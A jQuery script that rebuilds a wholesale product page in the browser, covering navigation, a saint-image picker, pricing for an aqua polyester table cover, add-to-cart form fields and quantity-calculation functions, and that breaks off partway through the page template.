$(document).ready(function () {

    initLogin();

   /******************************************************************/
   function initPageProduct() {

	$('body').empty();


    var body = `
        <body>
        <!--[if lt IE 7]>
        <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
        <div class="container" style="margin-bottom:0px; padding-bottom:0px;">
            <!-- start.container -->
            <div id="panel-left" class="noprint">
                <!-- start.left panel -->
                <div id="site-logo-container" class="panel-row">
                    <a href="https://www.portofinointl.com/" id="portofino-site-logo" title="Portofino International Trading USA, Inc." style="background:url(images/portofino-logo-2.jpg) no-repeat transparent;"></a>
                </div>
                <div id="menu-container" class="panel-row">
                    <script type="text/javascript">
                        function selectItem(id) {
                            if (id.className == "item-selected") {
                                id.className = "";
                            } else {
                                id.className = "item-selected";
                            }
                        }
                        
                        
                        function resetItem(div_class) {
                            $("div." + div_class + " a.item-selected").removeClass("item-selected");
                        }
                    </script>
                    <ul class="dropdown-menu parent-ul vertical-menu" role="menu" aria-labelledby="dropdownMenu">
                        <li class="list-group-item"><a href="products.php?status=2" style="color:#8C0000; font-size:15px;" class="highlight" id="new-items-tooltip">NEW ITEMS</a></li>
                        <li class="list-group-item"><a href="products.php?status=1" style="color:#8C0000; font-size:15px;" class="highlight" id="new-arrivals-tooltip">BACK IN STOCK</a></li>
                        <div id="new-items-tooltip-box" class="coming-soon-box" style="display: none; margin-left: 130px; margin-top: -15px; width: 150px; height: 45px;">New Portofino<br>products</div>
                        <div id="new-arrivals-tooltip-box" class="coming-soon-box" style="display: none; margin-left: 130px; margin-top: 5px; width: 150px; height: 45px;">New Arrivals<br>of existing products</div>
                        <li class="list-group-item"><a href="sale.php?view=grid&amp;status=2" style="color:#8C0000; font-size:15px;" class="highlight">SALE</a></li>
                        <li class="list-group-item"><a href="outlet.php?view=grid&amp;status=4" style="margin-bottom:20px;color:#8C0000; font-size:15px;" class="highlight">OUTLET</a></li>
                        <li class="list-group-item"><a href="shop_by_item.php" style="margin-top:5px;margin-bottom:2px;color:#8C0000; font-size:15px;" class="highlight">SHOP BY ITEM</a></li>
                        <li class="dropdown-submenu">
                            <a href="category.php?cl=1&amp;cid=11314" style="text-transform:uppercase;">Event Decor</a>
                        </li>
                        <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                            <a href="category.php?cl=1&cid=11314"><img src="images/event.jpg" width="720" /></a>
                            </div> -->
                        <li class="dropdown-submenu">
                            <a href="category.php?cl=1&amp;cid=11315" style="text-transform:uppercase;">Party &amp; Craft</a>
                        </li>
                        <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                            <a href="category.php?cl=1&cid=11315"><img src="images/party.jpg" width="720" /></a>
                            </div> -->
                        <li class="dropdown-submenu">
                            <a href="category.php?cl=1&amp;cid=11316" style="text-transform:uppercase;">Religious Gifts &amp; Keepsakes</a>
                        </li>
                        <!--  <div id="product-hero" class="" style="margin-bottom:10px;">
                            <a href="category.php?cl=1&cid=11316"><img src="images/religious.jpg" width="720" /></a>
                            </div> -->
                        <li style="display:none;" class="list-group-item">SHOP BY EVENT</li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Baby_Shower" style="text-transform:uppercase;">Baby Shower</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Baptism" style="text-transform:uppercase;">Baptism</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Craft_Supplies" style="text-transform:uppercase;">Craft Supplies</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Decorations" style="text-transform:uppercase;">Decorations</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Event_Planning" style="text-transform:uppercase;">Event Planning</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="First_Communion" style="text-transform:uppercase;">First Communion</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Floral_Supplies" style="text-transform:uppercase;">Floral Supplies</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Gifts_Favors" style="text-transform:uppercase;">Gifts &amp; Favors</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Glassware" style="text-transform:uppercase;">Glassware &amp; Vases</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Graduation" style="text-transform:uppercase;">Graduation</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Holiday_Seasonal" style="text-transform:uppercase;">Holiday &amp; Seasonal</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Home_Decor" style="text-transform:uppercase;">Home Decor</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Jewelry" style="text-transform:uppercase;">Jewelry</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Mardi_Gras" style="text-transform:uppercase;">Mardi Gras</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Mi_Presentacion_De_3_Anos" style="text-transform:uppercase;">Mi Presentacion De 3 Años</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Party_Supplies" style="text-transform:uppercase;">Party Supplies</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Quinceanera" style="text-transform:uppercase;">Quinceañera</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Religious" style="text-transform:uppercase;">Religious</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Ribbon_Trimming" style="text-transform:uppercase;">Ribbon &amp; Trimming</a></li>
                        <li style="display:none;" class="dropdown-submenu"><a href="Wedding" style="text-transform:uppercase;">Wedding</a></li>
                    </ul>
                    <p style="margin-top: 204px;"></p>
                    <div class="left-link-container" style="margin: 0 0 28px 10px !important;">
                        <div class="highlight-red" style="padding-bottom:5px;">VIEW CURRENT CATALOG</div>
                        <a href="https://issuu.com/portofinoadmin/docs/catalog_2024_forweb?fr=xKAE9_zU1NQ" target="_blank"><img src="uploads/catalog/Tiny catalog icon.jpg" width="179" border="0"></a>
                    </div>
                    <div class="highlight-red" style="margin-left:10px; line-height:15px;">SEARCH BY SAINTS &nbsp;&nbsp;<span style="cursor: pointer;" class="open_close">+ Open</span></div>
                    <!-- IMAGE PICKER -->
                    <div class="religious_container" style="display:none;">
                        <div id="imagePicker" class="left-scroll-panel scroll-panel-ht385 ps-container">
                            <div class="scroll-content">
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=GU|GU1&amp;sname=Our Lady of Guadalupe" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Our-Lady-of-Guadalupe.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">OUR LADY OF GUADALUPE</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=DN&amp;sname=Divine Child" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Divine-Child.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">DIVINE CHILD</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=JU&amp;sname=St. Jude" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Jude.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. JUDE</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=MI&amp;sname=St. Michael" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Michael.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. MICHAEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=DM&amp;sname=Divine Mercy" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Divine-Mercy.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">DIVINE MERCY</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=SHJ&amp;sname=Sacred Heart of Jesus" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Sacred-Heart-of-Jesus.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">SACRED HEART OF JESUS</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=LG&amp;sname=Lady of Grace" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Lady-of-Grace.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">LADY OF GRACE</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=CX&amp;sname=Crucifixion" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Crucifixion.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">CRUCIFIXION</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=ANT&amp;sname=St. Anthony" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Anthony.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. ANTHONY</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=CHA&amp;sname=San Charbel" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/San-Charbel.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">SAN CHARBEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=GAB&amp;sname=St. Gabriel" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Gabriel.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. GABRIEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=GA&amp;sname=Guardian Angel" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Guardian-Angel.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">GUARDIAN ANGEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=HF&amp;sname=Holy Family" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Holy-Family.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">HOLY FAMILY</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=HT&amp;sname=Holy Trinity" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Holy-Trinity.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">HOLY TRINITY</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=IC&amp;sname=Immaculate Conception" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Immaculate-Conception.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">IMMACULATE CONCEPTION</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=JO&amp;sname=St. Joseph" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Joseph.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. JOSEPH</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=JL&amp;sname=San Juan Del Los Lagos" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/San-Juan-Del-Los-Lagos.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">SAN JUAN DEL LOS LAGOS</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=MCS&amp;sname=St. Martin De Tours" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Martin-De-Tours.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. MARTIN DE TOURS</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=MP&amp;sname=St. Martin of Porres" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Martin-of-Porres.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. MARTIN OF PORRES</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=ATO&amp;sname=Nino De Atocha" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Nino-De-Atocha.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">NINO DE ATOCHA</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=CA&amp;sname=Our Lady of Carmel" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/Our-Lady-of-Carmel.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">OUR LADY OF CARMEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=RP&amp;sname=St. Raphael" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Raphael.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. RAPHAEL</span>
                                    </a>
                                </div>
                                <div class="image-picker-item">
                                    <a href="products.php?status=4&amp;color=RA&amp;sname=St. Raymond" id="religious_1" style="text-decoration:none;">
                                    <span class="picker-item-image"><img src="uploads/religious/St.-Raymond.jpg"></span>
                                    <span class="picker-item-label" style="text-decoration:none;">ST. RAYMOND</span>
                                    </a>
                                </div>
                            </div>
                            <div class="ps-scrollbar-x-rail" style="width: 190px; display: none; left: 0px; bottom: 3px;">
                                <div class="ps-scrollbar-x" style="left: 0px; width: 0px;"></div>
                            </div>
                            <div class="ps-scrollbar-y-rail" style="top: 0px; height: 385px; display: none; right: 3px;">
                                <div class="ps-scrollbar-y" style="top: 0px; height: 0px;"></div>
                            </div>
                        </div>
                    </div>
                    <div class="left-link-container">&nbsp;</div>
                    <script type="text/javascript">    
                        /*$(document).ready(function() {
                            var open_close_val = $('.open_close').text();
                            if(open_close_val == '+ Open'){
                                $('.open_close').click(function() {
                                    $('.religious_container').show('slow', 'linear');
                                    $('.open_close').text('- Close');   
                                });
                            }
                            if(open_close_val == '- Close'){
                                $('.open_close').click(function(){
                                    $('.religious_container').hide('slow', 'linear');
                                    $('.open_close').text('+ Open');
                                });  
                            }
                        });*/
                        /*$(document).ready(function() {
                        $('.open_close').clickToggle(function() {
                            $('.open_close').text('- Close');
                        }, function(){
                            $('.open_close').text('+ Open');
                        });*/
                        
                        $(document).ready(function(){
                        $('.open_close').click(function(){
                        
                        $('.religious_container').slideToggle('slow');
                        if($(this).text() == '- Close')
                        {
                            $(this).text('+ Open');
                        }
                        else
                        {
                            $(this).text('- Close');
                        }
                        });
                        
                        });
                    </script>                    
                </div>
                <!-- end.left panel -->
            </div>
            <div id="panel-right" class="">
                <!-- start.rightpanel -->
                <!-- level one -->
                <div id="panel-right-level-one-menu" class="panel-row" style="margin-top:5px; margin-bottom:5px;">
                    <div id="panel-right-menu-container" class="float-left noprint">
                        <!-- menu -->
                        <ul class="top-menu">
                            <li style="padding-right: 20px;"><a href="index.php">HOME</a></li>
                            <li style="padding-right: 20px;"><a href="https://www.portofinointl.com/about_us">ABOUT US</a></li>
                            <li style="padding-right: 20px;"><a href="quick_order.php" id="quick-order-soon-txt">QUICK ORDER</a></li>
                            <li style="padding-right: 20px;"><a href="myprofile.php?w=7" id="login-user">LOG OUT</a></li>
                            <li style="padding-right: 0;"><a href="shopcart.php" id="login-user">VIEW CART</a></li>
                        </ul>
                        <!-- end.menu -->
                    </div>
                    <div id="quick-order-soon-box" class="coming-soon-box" style="margin-left: 73px; margin-top: -20px; ">Coming Soon</div>
                    <div id="panel-right-search-container" class="float-right noprint" style="margin-right:2px;">
                        <!-- search -->
                        <form role="form" name="frmTopSearch" id="search-box-top" action="logs/search_log.php" method="get">
                            <input type="hidden" name="search" value="1">
                            <input type="text" class="form-control top-search-field fontRoboto txt-11" id="search-term" name="keyword" value="Search" onfocus="this.value='';" style="color:666666; font-weight:normal;">
                            <img src="images/magnifying-glass-1127234809.jpg" width="15" height="15" id="search-box-btn" align="right" style="border:none; cursor:pointer;" onclick="document.frmTopSearch.submit();">
                        </form>
                        <!-- end.search -->
                    </div>
                    <div class="clearfix"></div>
                </div>
                <!-- level one -->
                <!-- level two -->
                <div id="panel-right-level-two-menu" class="panel-row">
                    <div class="noprint">
                        <p><strong><span style="color:#FF0000">YOUR PREMIER BUSINESS TO BUSINESS SUPPLIER. </span>IMPORTER/EXPORTER OF CRAFTS, GIFTS, PARTY &amp; DECORATING SUPPLIES</strong></p>
                    </div>
                    <!-- top content -->
                    <div class="clearfix" style="width:750px;height:5px">&nbsp;</div>
                    <div id="panel-right-content" class="panel-row" style="width:720px;">
                        <div id="featured-product">
                            <div id="product-description" class="">
                                <div id="subcat-1" style="font-weight:bold;"><a href="alt_products.php?cid=0"></a></div>
                                <!-- this is if not from redtags category-->
                                <!-- /* jhun added end */ -->
                            </div>
                        </div>
                        <div class="product-details-container">
                            <div class="details-image">
                                <div id="product-selected-image">								<img id="product-image-file" src="https://portofino.azureedge.net/38-0026AQ.jpg" data-zoom-image="https://portofino.azureedge.net/38-0026AQ.jpg" width="360" alt="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Aqua" title="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Aqua">
                                </div>
                                <span class="text-hint">Roll over to zoom in</span>
                                <div>&nbsp;</div>
                                <div class="palette-images" id="palette-images-selection">
                                    <span style="padding-right:40px;"><a href="#" class="elevatezoom-gallery active" data-image="https://portofino.azureedge.net/38-0026AQ.jpg" data-zoom-image="https://portofino.azureedge.net/38-0026AQ.jpg">
                                    <img id="product-image-thumb" src="https://portofino.azureedge.net/38-0026AQ.jpg" alt="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Aqua" title="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Aqua" width="67"></a>
                                    </span>
                                    <div class="clearfix"></div>
                                </div>
                            </div>
                            <div class="details-options">
                                <div class="product-name fontMontserrat">Rectangle Polyester Table Cover 90" x 132" - Aqua</div>
                                <div class="option-container">
                                    <span class="option-label fontMontserrat">ITEMx:</span> <span class="option-label" id="pr_number">38-0026AQ</span>
                                    <img src="images/red_tag.png" border="0" style="margin-top:-20px;">                                								<br>
                                    <span class="option-label fontMontserrat">SIZE:</span> 90" x 132"								                                <br>
                                    <span class="option-label fontMontserrat">PACKAGING:</span> 12EA/INNER / 12EA/CASE                                <br>
                                    <span class="option-label fontMontserrat">DISCOUNT:</span> 
                                    <span class="discounted-price">
                                    <span id="pr_discount">30.00     </span>%
                                    </span><br>
                                    <span class="option-label fontMontserrat">INNER PRICE:</span> 
                                    <span id="pr_inner_price">
                                    <span class="discount-strike"><span class="fontBlack">$9.95 EA</span></span> / <span class="discounted-price">$6.97 EA</span>
                                    </span>
                                    <br>
                                    <span class="option-label fontMontserrat">CASE PRICE:</span>
                                    <span id="pr_case_price">
                                    <span class="discount-strike"><span class="fontBlack">$8.95 EA</span></span> / <span class="discounted-price">$6.27 EA</span>
                                    </span>
                                    <br>
                                    <span class="option-label fontMontserrat">UPC:</span> <span id="pr_upc">745910743288</span>
                                    <br>
                                    <span class="new-lower-price fontMontserrat">RED TAG SPECIAL</span>								                                
                                    <span style="display:block; margin-top:10px;">
                                    <span class="float-left">
                                    <span class="option-label fontMontserrat">AVAILABILITY</span>
                                    </span>
                                    <span class="minimum-required float-right" style="text-align:right; margin-right:-44px;">Minimum Required.</span>
                                    </span>
                                    <span style="display:block; clear:both;">
                                    <span class="float-left" id="pr_availability">
                                    20 Cases and 0 Inner									</span>
                                    <span class="minimum-required float-right" style="text-align:right; margin-right:-44px;">TOTAL QTY=12</span>
                                    </span>
                                    <span class="option-label fontRoboto txt-11" style="font-weight:normal; color:#FF0000;" id="inventory_error"></span>
                                    <br>
                                </div>
                                <div style="margin:0; padding:0; position:relative; z-index:100;">
                                    <div id="color-container" style="position:absolute; z-index:10000; background-color:#FFF;">
                                        <!-- MODIFIED this IF condition by jfp 01012023 - For Out of Stock and Active item to be available for PRE-ORDER - end -->
                                        <div class="color-container-row">
                                            <div class="color-container-col-first color-header fontMontserrat" onclick="toggleSubColor();" onkeypress="toggleSubColor();" style="cursor:pointer;">SELECT COLOR/S <img src="images/red-arrow-down.gif" border="0" height="14"></div>
                                            <div class="color-qty-header"><span class="fontMontserrat">SELECT ORDER QTY</span></div>
                                        </div>
                                        <script type="text/javascript">
                                            function computeTotalQty(color_id, unit_qty, no_cases, qty_per_case) {
                                                //alert(color_id + '---' + unit_qty + '---' + no_cases + '---' + qty_per_case);
                                                var total_qty = 0;
                                                if (unit_qty<1) unit_qty = 0;
                                                if (no_cases<1) no_cases = 0;
                                                //if (unit_qty!=0 && no_cases!=0 && qty_per_case!=0) {
                                                    total_qty = parseInt(unit_qty) + ( parseInt(no_cases) * parseInt(qty_per_case) ) ;
                                                //}
                                                $('#color-total-'+color_id).val(parseInt(total_qty));
                                                //alert("unit-qty="+unit_qty+" case="+no_cases+" case qty="+qty_per_case);
                                                return;
                                            } 
                                            
                                            function toggleSubColor() {
                                                //alert("toggle");
                                                    $("div[rel^='sub-color']").toggle();
                                                    
                                                    if ( $("div[rel^='sub-color']").is(':visible') ) {
                                                        //alert("shown");
                                                        $("div[rel='sub-color-last']").css("border-bottom", "1px solid #777777");
                                                        $("div[rel='first-color']").css("border-bottom", "none");
                                                    } else {
                                                        $("div[rel='first-color']").css("border-bottom", "1px solid #777777");
                                                    }
                                                    
                                                    return;
                                                
                                            }
                                            
                                            function changeProductDisplay(color_id) {
                                                //alert($('#pr_series_number_'+color_id).html());
                                                    
                                                    $('#pr_number').html($('#pr_series_number_'+color_id).html());
                                                    $('#pr_upc').html($('#pr_series_upc_'+color_id).html());
                                                    $('#product-image-thumb').attr("src",$('#pr_series_image_'+color_id).html());
                                                    $('#product-image-thumb').attr('width','67');
                                                    $('#item_inner_price').html($('#pr_series_inner_price_'+color_id).html());
                                                    $('#item_case_price').html($('#pr_series_case_price_'+color_id).html());
                                                    $('#pr_discount').html($('#pr_series_discount_'+color_id).html());
                                                    $('#pr_discount_2').html($('#pr_series_discount_2_'+color_id).html());
                                                    $('#pr_availability').html($('#pr_series_availability_'+color_id).html());
                                                    
                                                    //$('#product-selected-image').html('<img id="product-image-file" src="'+$('#pr_series_image_'+color_id).html()+'" data-zoom-image="'+$('#pr_series_image_'+color_id).html()+'" width="360"/>');
                                                    
                                                product_active_image = $('#product-image-file');
                                                product_active_image.removeData('elevateZoom');
                                            
                                                // Update source for images
                                                product_active_image.attr('src', $('#pr_series_image_'+color_id).html());
                                                product_active_image.data('zoom-image', $('#pr_series_image_'+color_id).html());
                                                product_active_image.attr('width', '360');
                                                product_active_image.elevateZoom(zoomConfig); 
                                            
                                            
                                            }
                                            
                                            function computeInnerAndCaseQty(color_id, total_case, total_inner, qty_per_case, min_inner_qty, isFromAddToCart) {
                                                //alert("---id=" + color_id + "---totalcase=" + total_case+ "---totalinner=" + total_inner + "---qtypercase=" + qty_per_case + "---mininnerqty=" + min_inner_qty);
                                                
                                                var total_inner = parseInt(total_inner) || 0;
                                                var total_case = parseInt(total_case) || 0;
                                                var total_case_unit = 0;
                                                var total_inner_unit = 0;
                                                var total_qty = 0;
                                                var adtl_case = 0;
                                            
                                                var isWithQtyErr = 0;
                                                
                                                
                                                total_inner_unit = parseInt(total_inner) * parseInt(min_inner_qty);
                                                
                                                if (parseInt(total_inner_unit) >= parseInt(qty_per_case)) {
                                                    adtl_case = parseInt(total_inner_unit / parseInt(qty_per_case));
                                                    total_inner_unit = total_inner_unit % parseInt(qty_per_case);
                                                    total_inner = parseInt(total_inner_unit / parseInt(min_inner_qty));
                                                    total_case = total_case + adtl_case;
                                                }
                                                total_case_unit = (parseInt(total_case)) * parseInt(qty_per_case);
                                                total_qty = (parseInt(total_case_unit) + parseInt(total_inner_unit));
                                                
                                                
                                                $('#color-total-'+color_id).val(parseInt(total_qty));
                                                if (parseInt(total_case)==0) {
                                                    $('#color-case-'+color_id).val("");	
                                                } else {
                                                    $('#color-case-'+color_id).val(parseInt(total_case));	
                                                }
                                                
                                                if (parseInt(total_inner)==0) {
                                                    $('#color-qty-'+color_id).val("");
                                                } else {
                                                    $('#color-qty-'+color_id).val(parseInt(total_inner));
                                                }
                                                    
                                                    //return isWithQtyErr;
                                            }
                                            
                                            function doubleCheckQty(series_count) {
                                                var isOk = true;
                                                var isWithQtyErr = 0;
                                            
                                                
                                                for (i=0; i<series_count; i++) {
                                                    /*isNotInDenomination = parseInt($("#color-total-"+i).val()) % parseInt();*/
                                                    
                                            
                                                    //if (isNotInDenomination || (parseInt($("#color-total-"+i).val())<parseInt())) {
                                                        //var isConfirm = alert("Sold in multiples of "+parseInt()+" units");
                                                    //}
                                                    
                                                    
                                                    
                                                    isWithQtyErr = computeInnerAndCaseQty(i,$("#color-case-"+i).val(),$("#color-qty-"+i).val(),$("#case_qty").val(),'12',1);
                                                    
                                                    if (isWithQtyErr) {
                                                        alert("Sorry, your order cannot be added to cart.\nThis item is sold in multiples of "+parseInt(12)+" units.\nPlease double check your ordered quantity before adding to cart.")
                                                        isOk = false;
                                                        break;	
                                                    }
                                                }
                                                
                                                return isOk;
                                            }
                                            
                                        </script>
                                        <form role="form" id="cart-order-form" name="frmAddToCart" method="post" action="process.php">
                                            <input type="hidden" name="option[]" value="add2cart">
                                            <div id="color-images-selection">
                                                <span id="pr_series_number_0" style="display:none;">38-0026AQ</span>
                                                <span id="pr_series_image_0" style="display:none;">https://portofino.azureedge.net/38-0026AQ.jpg</span>
                                                <span id="pr_series_upc_0" style="display:none;">745910743288</span>
                                                <span id="pr_series_case_price_0" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_0" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_0" style="display:none;">30.00     </span>
                                                <span id="pr_series_discount_2_0" style="display:none;"></span>
                                                <span id="pr_series_availability_0" style="display:none;">20 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border color-container-bottom-border" rel="first-color">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(0);">
                                                        <img src="uploads/palette/20140721190438AQ.jpg" width="31" height="16" style="margin-top:-0.07em;" align="absmiddle">&nbsp;(AQ) Aqua										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026AQ">
                                                        <input type="hidden" name="item_name[38-0026AQ]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Aqua">
                                                        <input type="hidden" name="item_image[38-0026AQ]" value="https://portofino.azureedge.net/38-0026AQ.jpg">
                                                        <input type="hidden" name="item_class[38-0026AQ]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026AQ]" value="745910743288">
                                                        <input type="hidden" name="color[38-0026AQ]" value="AQ">
                                                        <input type="hidden" name="discount[38-0026AQ]" value="30.00     ">
                                                        <input type="hidden" name="discount_2[38-0026AQ]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026AQ]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026AQ]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026AQ]" value="Y">
                                                        <input type="hidden" name="isSale[38-0026AQ]" value="">
                                                        <input type="hidden" name="isNew[38-0026AQ]" value="">
                                                        <input type="hidden" name="isBack[38-0026AQ]" value="">
                                                        <select class="item_total_qty" id="color-total-0" name="total_qty[38-0026AQ]" onchange="moreQty(this.value, '240','38-0026AQ',0);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                            <option value="168">168 (14 cases)</option>
                                                            <option value="180">180 (15 cases)</option>
                                                            <option value="192">192 (16 cases)</option>
                                                            <option value="204">204 (17 cases)</option>
                                                            <option value="216">216 (18 cases)</option>
                                                            <option value="228">228 (19 cases)</option>
                                                            <option value="240">240 (20 cases)</option>
                                                            <option value="249">249</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-0" name="request_qty[38-0026AQ]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_1" style="display:none;">38-0026</span>
                                                <span id="pr_series_image_1" style="display:none;">https://portofino.azureedge.net/38-0026.jpg</span>
                                                <span id="pr_series_upc_1" style="display:none;">745721051442</span>
                                                <span id="pr_series_case_price_1" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_1" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_1" style="display:none;"></span>
                                                <span id="pr_series_discount_2_1" style="display:none;"></span>
                                                <span id="pr_series_availability_1" style="display:none;">39 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(1);">
